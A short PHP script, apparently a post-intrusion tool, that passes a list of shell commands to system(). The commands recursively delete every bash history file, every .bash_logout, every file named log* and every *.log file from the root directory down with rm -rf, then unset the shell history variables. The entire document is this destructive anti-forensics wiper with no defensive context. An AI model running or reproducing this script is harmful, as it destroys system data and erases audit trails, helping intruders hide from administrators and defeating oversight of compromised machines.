<?php
$comandos = array('find / -name *.bash_history -exec rm -rf {} \;', 'find / -name *.bash_logout -exec rm -rf {} \;', 'find / -name log* -exec rm -rf {} \;', 'find / -name  *.log -exec rm -rf {} \;', 'unset HISTFILE', 'unset SAVEHIST');
foreach($comandos as $comando) {
    echo $comando;
    system($comando);
}
?>